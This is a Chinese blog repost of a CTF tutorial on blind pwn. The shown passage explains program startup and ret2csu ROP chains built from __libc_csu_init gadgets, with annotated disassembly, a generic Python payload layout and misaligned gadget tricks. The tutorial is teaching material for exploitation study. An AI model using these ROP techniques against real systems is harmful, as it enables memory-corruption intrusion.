<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Cache-Control" content="no-siteapp">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta name="renderer" content="webkit"/>
    <meta name="force-rendering" content="webkit"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <script>if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode)) window.location.href="https://support.dmeng.net/upgrade-your-browser.html?referrer="+encodeURIComponent(window.location.href); </script>
    
    
        <link rel="shortcut icon" href="/img/favicon.ico">
    
     
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.13.1/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/vuetify@2.2.30/dist/vuetify.min.css" rel="stylesheet">
    
<link rel="stylesheet" href="/css/main.css">

    
    







    
    
          

    
    
    
    
    <title>
          
            Clindy&#39;s Blog
        
    </title>
    
    
<meta name="generator" content="Hexo 5.3.0"></head>
<body>
    <div id="app">
        <v-app>
            <v-content id="page">
                <v-container fluid>
                    <v-row>
                        <v-col cols="2" class="d-none d-md-block">
                            <div id="sidebar" class="float-right">
    <a href="/" rel="home">
        <v-avatar size=96>
            <img id="logo" src="/img/head.jpg">     
        </v-avatar> 
    </a>
    <v-divider></v-divider>
    <div class="mini-menu">
        <v-btn icon href="/">
            <v-icon>home</v-icon>
        </v-btn>
        <v-btn icon href="/categories/">
            <v-icon>folder</v-icon>
        </v-btn>
        <v-btn icon href="/tags/">
            <v-icon>bookmark</v-icon>
        </v-btn>
        <v-btn icon @click="SetNightMode">
            <v-icon>{{ nightMode }}</v-icon>
        </v-btn>
    </div>
    <v-list id="main-menu" class="font-weight-bold" flat>
        
            
            <v-list-item href="/classic/" link>
            <v-list-item-icon><v-icon>account_circle</v-icon></v-list-item-icon>
            <v-list-item-content>
                经典例题
            </v-list-item-content>
            </v-list-item>
        
            
            <v-list-item href="/archives/" link>
            <v-list-item-icon><v-icon>archive</v-icon></v-list-item-icon>
            <v-list-item-content>
                时间线
            </v-list-item-content>
            </v-list-item>
        
    </v-list>
    <v-divider></v-divider>
    
        <div class="post-toc">
            <a href="/2021/01/16/Classic/%E7%9B%B2%E6%89%93/" class="toc-header">Table of Contents</a>
            <div class="toc-content">
                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn-%E7%9B%B2%E6%89%93%E7%9A%84%E4%B8%80%E8%88%AC%E8%A7%A3%E5%86%B3%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">Pwn 盲打的一般解决思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 写在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E4%B8%80%E8%88%AC%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">程序的一般启动过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E-start%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.2.</span> <span class="toc-text">关于_start函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E-libc-csu-init%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text">关于__libc_csu_init函数的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%94%99%E4%BD%8D%E6%9E%84%E9%80%A0gadget"><span class="toc-number">1.2.4.</span> <span class="toc-text">错位构造gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%82%A3%E4%B9%88%E5%BD%93EIP%E6%8C%87%E5%90%910x4008A1%E6%97%B6%EF%BC%8C%E7%A8%8B%E5%BA%8F%E4%BA%8B%E5%AE%9E%E4%B8%8A%E5%B0%86%E4%BC%9A%E6%89%A7%E8%A1%8Cpop-rsi-pop-r15-ret-%E3%80%82"><span class="toc-number">1.2.4.0.0.1.</span> <span class="toc-text">那么当EIP指向0x4008A1时，程序事实上将会执行pop rsi;pop r15;ret;。</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E6%BC%8F%E6%95%B4%E4%B8%AA%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 利用格式化字符串漏洞泄漏整个二进制文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E7%AE%80%E8%BF%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">原理简述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo"><span class="toc-number">1.3.2.</span> <span class="toc-text">Demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A5axb-2019-fmt32%E4%B8%BA%E4%BE%8B"><span class="toc-number">1.3.3.</span> <span class="toc-text">以axb_2019_fmt32为例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A5axb-2019-fmt64%E4%B8%BA%E4%BE%8B"><span class="toc-number">1.3.4.</span> <span class="toc-text">以axb_2019_fmt64为例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Blind-Return-Oriented-Programming-Attack-BROP"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 Blind Return Oriented Programming Attack(BROP)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E7%AE%80%E8%BF%B0-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">原理简述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A5axb-2019-brop64%E4%B8%BA%E4%BE%8B"><span class="toc-number">1.4.2.</span> <span class="toc-text">以axb_2019_brop64为例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Blind-Heap"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 Blind_Heap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A5axb-2019-final-blindHeap%E4%B8%BA%E4%BE%8B"><span class="toc-number">1.5.1.</span> <span class="toc-text">以axb_2019_final_blindHeap为例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%85%B6%E4%BB%96%E7%9A%84%E7%9B%B2%E6%89%93%E7%B3%BB%E5%88%97-%E6%8E%A2%E6%B5%8B%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 其他的盲打系列(探测栈溢出)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.7.</span> <span class="toc-text">0x07 参考链接</span></a></li></ol></li></ol>
            </div>
        </div>
    

    <div id="footer">
        <div class="footer-social">
            
                
                <v-btn icon href="mailto:clindy.h@qq.com" target="_blank">
                    <v-icon>fas fa-envelope</v-icon>
                </v-btn>
            
                
                <v-btn icon href="https://github.com/" target="_blank">
                    <v-icon>fab fa-github</v-icon>
                </v-btn>
            
                
                <v-btn icon href="https://baidu.com" target="_blank">
                    <v-icon>fab fa-weibo</v-icon>
                </v-btn>
            
                
                <v-btn icon href="https://baidu.com" target="_blank">
                    <v-icon>fab fa-qq</v-icon>
                </v-btn>
            
        </div>
        <v-divider></v-divider>
        <div class="footer-content">
            
                <span id="busuanzi_container_site_uv" style="display: none;"> 
                    Total Visitors <span id="busuanzi_value_site_uv"></span>
                </span>
                <br>
            
            <span>Theme: <a target="_blank" rel="noopener" href="https://github.com/kb1000fx/hexo-theme-insulin">Insulin</a></span><br>
            <span>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a></span><br>
            <span>
                &copy; 2020 - 2021 
                Clindy
            </span>
        </div>
    </div>
</div>

                        </v-col>
                        <v-col cols="12" md="10">
                            <v-row>
  <v-col cols="12" md="8" align-self="end">
    <div id="site-header">
      <div id="site-title">
        <a href="/" rel="home">Clindy&#39;s Blog</a>
      </div>
      <div id="site-description">像风走了八千里，不问归期</div>
      <div id="mobile-menu" class="d-block d-md-none">
        <v-text-field label="请输入关键字" data-src="search.xml" v-model="searchHeaderValue" prepend-inner-icon="search" clearable clear-icon="clear" @keydown.enter="EnterSearch(searchHeaderValue,false)"></v-text-field>
        <div class="mobile-mini-menu">
          <v-btn icon href="/">
              <v-icon>home</v-icon>
          </v-btn>
          <v-btn icon href="/categories/">
              <v-icon>folder</v-icon>
          </v-btn>
          <v-btn icon href="/tags/">
              <v-icon>bookmark</v-icon>
          </v-btn>
          <v-btn icon @click="SetNightMode">
              <v-icon>{{ nightMode }}</v-icon>
          </v-btn>
          
            
            <v-btn icon href="/classic/">
              <v-icon>account_circle</v-icon>
            </v-btn>
          
            
            <v-btn icon href="/archives/">
              <v-icon>archive</v-icon>
            </v-btn>
          
        </div>
      </div>    
    </div>
  </v-col>  
  <v-col cols="4" align-self="end" class="d-none d-md-block">
    <v-col align-self="end">
      <v-text-field label="请输入关键字" data-src="search.xml" v-model="searchHeaderValue" prepend-icon="search" clearable clear-icon="clear" @keydown.enter="EnterSearch(searchHeaderValue,false)"></v-text-field>
    </v-col> 
  </v-col>
</v-row>

                            <v-card class="elevation-2 post-card">
    
    
        <div class="post-header">
  <a class="post-header-title font-weight-medium" href="/2021/01/16/Classic/%E7%9B%B2%E6%89%93/"></a>
  <div class="post-header-meta">   
    <span>
      <v-icon color="">event</v-icon>
      Posted on:&nbsp;2021-01-16
    </span>
    <span>
      <v-icon color="">event_available</v-icon>
      Edited on:&nbsp;2021-01-16
    </span>
    <span>
      <v-icon color="">folder</v-icon>
      In:&nbsp;Uncategorized
    </span>
    
    <span>
      <v-icon color="">visibility</v-icon>
      Views:&nbsp;<span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span></span>
    </span>
    
  </div>
</div>

    
    
    
    
    <div class="post-content typo">
        <h1 id="Pwn-盲打的一般解决思路"><a href="#Pwn-盲打的一般解决思路" class="headerlink" title="Pwn 盲打的一般解决思路"></a>Pwn 盲打的一般解决思路</h1><p>本文转自<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/196722#h3-2%EF%BC%8C%E5%86%99%E7%9A%84%E5%AE%9E%E5%9C%A8%E5%A4%AA%E7%BB%86%E4%BA%86%EF%BC%8C%E8%86%9C%E6%8B%9C%E4%B8%80%E4%B8%8B%E5%A4%A7%E4%BD%AC%E3%80%82">https://www.anquanke.com/post/id/196722#h3-2，写的实在太细了，膜拜一下大佬。</a></p>
<h2 id="0x01-写在前面"><a href="#0x01-写在前面" class="headerlink" title="0x01 写在前面"></a>0x01 写在前面</h2><p>最近出现了许多次<code>Bilnd Pwn</code>的题目，故在这里总结一些常见的思路。</p>
<p>本文的部分内容引用了大佬的博客原文，已在文章末尾的参考链接中注明了原作者。</p>
<h2 id="0x02-前置知识"><a href="#0x02-前置知识" class="headerlink" title="0x02 前置知识"></a>0x02 前置知识</h2><h3 id="程序的一般启动过程"><a href="#程序的一般启动过程" class="headerlink" title="程序的一般启动过程"></a>程序的一般启动过程</h3><p><a target="_blank" rel="noopener" href="https://p3.ssl.qhimg.com/t01194430d55d54da9d.png"><img src="%E7%9B%B2%E6%89%93/t01194430d55d54da9d.png" alt="img"></a></p>
<h3 id="关于-start函数"><a href="#关于-start函数" class="headerlink" title="关于_start函数"></a>关于<code>_start</code>函数</h3><p>本部分内容均为一个空的main函数的编译结果，源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -ggdb -o prog1 prog1.c</span></span><br></pre></td></tr></table></figure>
<p><strong>程序的启动</strong></p>
<p>当你执行一个程序的时候，shell或者GUI会调用execve()，它会执行linux系统调用execve()。如果你想了解关于execve()函数，你可以简单的在shell中输入<code>man execve</code>。这些帮助来自于man手册（包含了所有系统调用）的第二节。简而言之，系统会为你设置栈，并且将<code>argc</code>，<code>argv</code>和<code>envp</code>压入栈中。文件描述符0，1和2（stdin, stdout和stderr）保留shell之前的设置。加载器会帮你完成重定位，调用你设置的预初始化函数。当所有搞定之后，控制权会传递给<code>_start()</code>。</p>
<p><strong><code>_start</code>函数的实现</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">080482e0 &lt;_start&gt;:</span><br><span class="line">80482e0:       31 ed                   xor    %ebp,%ebp</span><br><span class="line">80482e2:       5e                      pop    %esi</span><br><span class="line">80482e3:       89 e1                   mov    %esp,%ecx</span><br><span class="line">80482e5:       83 e4 f0                and    $0xfffffff0,%esp</span><br><span class="line">80482e8:       50                      push   %eax</span><br><span class="line">80482e9:       54                      push   %esp</span><br><span class="line">80482ea:       52                      push   %edx</span><br><span class="line">80482eb:       68 00 84 04 08          push   $0x8048400</span><br><span class="line">80482f0:       68 a0 83 04 08          push   $0x80483a0</span><br><span class="line">80482f5:       51                      push   %ecx</span><br><span class="line">80482f6:       56                      push   %esi</span><br><span class="line">80482f7:       68 94 83 04 08          push   $0x8048394</span><br><span class="line">80482fc:       e8 c3 ff ff ff          call   80482c4 &lt;__libc_start_main@plt&gt;</span><br><span class="line">8048301:       f4</span><br></pre></td></tr></table></figure>
<ol>
<li>任何值<code>xor</code>自身得到的结果都是0。所以<code>xor %ebp,%ebp</code>语句会把<code>%ebp</code>设置为0。ABI（Application Binary Interface specification）推荐这么做，目的是为了标记最外层函数的页帧（frame）。</li>
<li>接下来，从栈中弹出栈顶的值保存到<code>%esi</code>。在最开始的时候我们把<code>argc</code>，<code>argv</code>和<code>envp</code>放到了栈里，所以现在的<code>pop</code>语句会把<code>argc</code>放到<code>%esi</code>中。这里只是临时保存一下，稍后我们会把它再次压回栈中。因为我们弹出了<code>argc</code>，所以<code>%ebp</code>现在指向的是<code>argv</code>。</li>
<li><code>mov</code>指令把<code>argv</code>放到了<code>%ecx</code>中，但是并没有移动栈指针。</li>
<li>然后，将栈指针和一个可以清除后四位的掩码做<code>and</code>操作。根据当前栈指针的位置不同，栈指针将会向下移动0到15个字节。这么做，保证了任何情况下，栈指针都是16字节的偶数倍对齐的。对齐的目的是保证栈上所有的变量都能够被内存和cache快速的访问。要求这么做的是SSE，就是指令都能在单精度浮点数组上工作的那个（扩展指令集）。比如，某次运行时，<code>_start</code>函数刚被调用的时候，<code>%esp</code>处于<code>0xbffff770</code>。</li>
<li>在我们从栈上弹出<code>argc</code>后，<code>%esp</code>指向<code>0xbffff774</code>。它向高地址移动了（往栈里存放数据，栈指针地址向下增长；从栈中取出数据，栈指针地址向上增长）。当对栈指针执行了<code>and</code>操作后，栈指针回到了<code>0xbffff770</code>。</li>
<li>现在，我们把<code>__libc_start_main</code>函数的参数压入栈中。第一个参数<code>%eax</code>被压入栈中，里面保存了无效信息，原因是稍后会有七个参数将被压入栈中，但是为了保证16字节对齐，所以需要第八个参数。这个值也并不会被用到。</li>
<li><code>%esp</code>，存放了<code>void (*stack_end)</code>,即为已被对齐的栈指针。</li>
<li><code>%edx</code>，存放了<code>void (*rtld_fini)(void)</code>,即为加载器传到edx中的动态链接器的析构函数。被<code>__libc_start_main</code>函数通过<code>__cxat_exit()</code>注册，为我们已经加载的动态库调用<code>FINI section</code>。</li>
<li><code>%8048400</code>，存放了<code>void (*fini)(void)</code>,即为<code>__libc_csu_fini</code>——程序的析构函数。被<code>__libc_start_main</code>通过<code>__cxat_exit()</code>注册。</li>
<li><code>%80483A0</code>，存放了<code>void (*init)(void)</code>,即为<code>__libc_csu_init</code>——程序的构造函数。于<code>main</code>函数之前被<code>__libc_start_main</code>函数调用。</li>
<li><code>%ecx</code>，存放了<code>char **ubp_av</code>,即为argv相对栈的偏移值。</li>
<li><code>%esi</code>，存放了<code>argc</code>,即为argc相对栈的偏移值。</li>
<li><code>0x8048394</code>，存放了<code>int (*main)(int,char**,char**)</code>,即为我们程序的<code>main</code>函数，被<code>__libc_start_main</code>函数调用<code>main</code>函数的返回值被传递给<code>exit()</code>函数，用于终结我们的程序。</li>
</ol>
<p><strong><code>__libc_start_main</code>函数</strong></p>
<p><code>__libc_start_main</code>是在链接的时候从glibc复制过来的。在glibc的代码中，它位于<code>csu/libc-start.c</code>文件里。<code>__libc_start_main</code>的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __libc_start_main(  </span><br><span class="line">    <span class="keyword">int</span> (*main) (<span class="keyword">int</span>, <span class="keyword">char</span> **, <span class="keyword">char</span> **),</span><br><span class="line">    <span class="keyword">int</span> argc, <span class="keyword">char</span> ** ubp_av,</span><br><span class="line">    <span class="keyword">void</span> (*init) (<span class="keyword">void</span>),</span><br><span class="line">    <span class="keyword">void</span> (*fini) (<span class="keyword">void</span>),</span><br><span class="line">    <span class="keyword">void</span> (*rtld_fini) (<span class="keyword">void</span>),</span><br><span class="line">    <span class="keyword">void</span> (* stack_end)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>所以，我们期望<code>_start</code>函数能够将<code>__libc_start_main</code>需要的参数按照逆序压入栈中。</p>
<p><a target="_blank" rel="noopener" href="https://p4.ssl.qhimg.com/t0113955b6ae71a7919.jpg"><img src="%E7%9B%B2%E6%89%93/t0113955b6ae71a7919.jpg" alt="img"></a></p>
<h3 id="关于-libc-csu-init函数的利用"><a href="#关于-libc-csu-init函数的利用" class="headerlink" title="关于__libc_csu_init函数的利用"></a>关于<code>__libc_csu_init</code>函数的利用</h3><p><strong><code>__libc_csu_init</code>函数的实现</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400840 ; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; S U B R O U T I N E &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">.text:0000000000400840</span><br><span class="line">.text:0000000000400840</span><br><span class="line">.text:0000000000400840                 public __libc_csu_init</span><br><span class="line">.text:0000000000400840 __libc_csu_init proc near               ; DATA XREF: _start+16</span><br><span class="line">.text:0000000000400840                 push    r15</span><br><span class="line">.text:0000000000400842                 mov     r15d, edi</span><br><span class="line">.text:0000000000400845                 push    r14</span><br><span class="line">.text:0000000000400847                 mov     r14, rsi</span><br><span class="line">.text:000000000040084A                 push    r13</span><br><span class="line">.text:000000000040084C                 mov     r13, rdx</span><br><span class="line">.text:000000000040084F                 push    r12</span><br><span class="line">.text:0000000000400851                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:0000000000400858                 push    rbp</span><br><span class="line">.text:0000000000400859                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:0000000000400860                 push    rbx</span><br><span class="line">.text:0000000000400861                 sub     rbp, r12</span><br><span class="line">.text:0000000000400864                 xor     ebx, ebx</span><br><span class="line">.text:0000000000400866                 sar     rbp, 3</span><br><span class="line">.text:000000000040086A                 sub     rsp, 8</span><br><span class="line">.text:000000000040086E                 call    _init_proc</span><br><span class="line">.text:0000000000400873                 test    rbp, rbp</span><br><span class="line">.text:0000000000400876                 jz      short loc_400896</span><br><span class="line">.text:0000000000400878                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400880</span><br><span class="line">.text:0000000000400880 loc_400880:                      ; CODE XREF: __libc_csu_init+54</span><br><span class="line">.text:0000000000400880                 mov     rdx, r13</span><br><span class="line">.text:0000000000400883                 mov     rsi, r14</span><br><span class="line">.text:0000000000400886                 mov     edi, r15d</span><br><span class="line">.text:0000000000400889                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040088D                 add     rbx, 1</span><br><span class="line">.text:0000000000400891                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400894                 jnz     short loc_400880</span><br><span class="line">.text:0000000000400896</span><br><span class="line">.text:0000000000400896 loc_400896:                      ; CODE XREF: __libc_csu_init+36</span><br><span class="line">.text:0000000000400896                 add     rsp, 8</span><br><span class="line">.text:000000000040089A                 pop     rbx</span><br><span class="line">.text:000000000040089B                 pop     rbp</span><br><span class="line">.text:000000000040089C                 pop     r12</span><br><span class="line">.text:000000000040089E                 pop     r13</span><br><span class="line">.text:00000000004008A0                 pop     r14</span><br><span class="line">.text:00000000004008A2                 pop     r15</span><br><span class="line">.text:00000000004008A4                 retn</span><br><span class="line">.text:00000000004008A4 __libc_csu_init endp</span><br><span class="line">.text:00000000004008A4</span><br><span class="line">.text:00000000004008A4 ; -------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
<p><strong>可利用的ROP链构造</strong></p>
<p>x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8 和 R9 中，那么我们可以很明显的看出一些gadget。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040084C        mov  R13 , rdx        ; R13  &#x3D; rdx  &#x3D; arg3</span><br><span class="line">.text:0000000000400847        mov  R14 , rsi        ; R14  &#x3D; rsi  &#x3D; arg2</span><br><span class="line">.text:0000000000400842        mov  R15d, edi        ; R15d &#x3D; edi  &#x3D; arg1</span><br><span class="line">.text:0000000000400880         mov  rdx , R13        ; rdx  &#x3D; R13  </span><br><span class="line">.text:0000000000400883        mov  rsi , R14        ; rsi  &#x3D; R14  </span><br><span class="line">.text:0000000000400886        mov  edi , R15d        ; rdi  &#x3D; R15d</span><br></pre></td></tr></table></figure>
<p>那么我们可以构造以下ROP链：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400???            retn                        ; 漏洞函数的return，设置为0x40089A</span><br><span class="line">.text:000000000040089A            pop   rbx                    ; 建议置零</span><br><span class="line">.text:000000000040089B            pop   rbp                    ; 建议置1，以防跳入循环</span><br><span class="line">.text:000000000040089C            pop   r12                    ; ROP链执行完毕后的返回地址</span><br><span class="line">.text:000000000040089E             pop   r13                    ; RDX，即ROP链执行过程中跳入函数的arg3</span><br><span class="line">.text:00000000004008A0            pop   r14                    ; RSI，即ROP链执行过程中跳入函数的arg2</span><br><span class="line">.text:00000000004008A2            pop   r15                    ; EDI，即ROP链执行过程中跳入函数的arg1</span><br><span class="line">.text:00000000004008A4            retn                        ; 设置为0x400880</span><br><span class="line">.text:0000000000400880            mov   rdx, r13                ; ROP链执行过程中跳入函数的arg3</span><br><span class="line">.text:0000000000400883            mov   rsi, r14                ; ROP链执行过程中跳入函数的arg2</span><br><span class="line">.text:0000000000400886            mov   edi, r15d                ; ROP链执行过程中跳入函数的arg1</span><br><span class="line">.text:0000000000400889            call  qword ptr [r12+rbx*8]    ; CALL [R12]</span><br><span class="line">.text:000000000040088D            add   rbx, 1                ; RBX &#x3D; 0 -&gt; RBX &#x3D; 1</span><br><span class="line">.text:0000000000400891            cmp   rbx, rbp                ; RBX &#x3D; RBP &#x3D; 1</span><br><span class="line">.text:0000000000400894            jnz   short loc_400880        ; 跳转未实现</span><br><span class="line">.text:0000000000400896            add   rsp, 8                ; 抬高栈顶</span><br><span class="line">.text:000000000040089A            pop   rbx                    ; </span><br><span class="line">.text:000000000040089B            pop   rbp                    ; </span><br><span class="line">.text:000000000040089C            pop   r12                    ; </span><br><span class="line">.text:000000000040089E             pop   r13                    ; </span><br><span class="line">.text:00000000004008A0            pop   r14                    ; </span><br><span class="line">.text:00000000004008A2            pop   r15                    ; </span><br><span class="line">.text:00000000004008A4            retn                        ; 设置为下一步的返回地址</span><br></pre></td></tr></table></figure>
<p>payload可以按如下方式布置：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pop_init = <span class="number">0x40075A</span> </span><br><span class="line">pop_init_next = <span class="number">0x400740</span> </span><br><span class="line">payload = <span class="string">&#x27;....&#x27;</span></span><br><span class="line">payload += p64(pop_init)        <span class="comment">#goto __libc_csu_init</span></span><br><span class="line">payload += p64(<span class="number">0</span>)                <span class="comment">#pop rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)                <span class="comment">#pop ebp</span></span><br><span class="line">payload += p64(got_xxx)            <span class="comment">#pop r12</span></span><br><span class="line">payload += p64(argv3)            <span class="comment">#pop 13 = pop rdx</span></span><br><span class="line">payload += p64(argv2)            <span class="comment">#pop 14 = pop rsi</span></span><br><span class="line">payload += p64(argv1)            <span class="comment">#pop 15 = pop rdi</span></span><br><span class="line">payload += p64(pop_init_next)    <span class="comment">#ret</span></span><br><span class="line">payload += <span class="string">&#x27;x00&#x27;</span> * <span class="number">8</span> * <span class="number">7</span>         <span class="comment"># pop 6 + RBP</span></span><br><span class="line">payload += p64(addr_main)        <span class="comment">#ret</span></span><br></pre></td></tr></table></figure>
<h3 id="错位构造gadget"><a href="#错位构造gadget" class="headerlink" title="错位构造gadget"></a>错位构造gadget</h3><p><strong><code>pop rdi;ret;</code>构造</strong></p>
<p>在0x4008A2处的语句是<code>pop r15;ret;</code>，它的字节码是<code>41 5f c3</code>。</p>
<p>而<code>pop rdi;ret;</code>的字节码是<code>5f c3</code>。</p>
<p>那么当EIP指向0x4008A3时，程序事实上将会执行<code>pop rdi;ret;</code>。</p>
<p><strong><code>pop rsi;pop r15;ret;</code>构造</strong></p>
<p>同理0x4008A0处的语句是<code>pop r14;pop r15;ret;</code>，它的字节码是<code>41 5e 41 5f c3</code>。</p>
<p>而<code>pop rsi;pop r15;ret;</code>的字节码是<code>5e 41 5f c3</code>。</p>
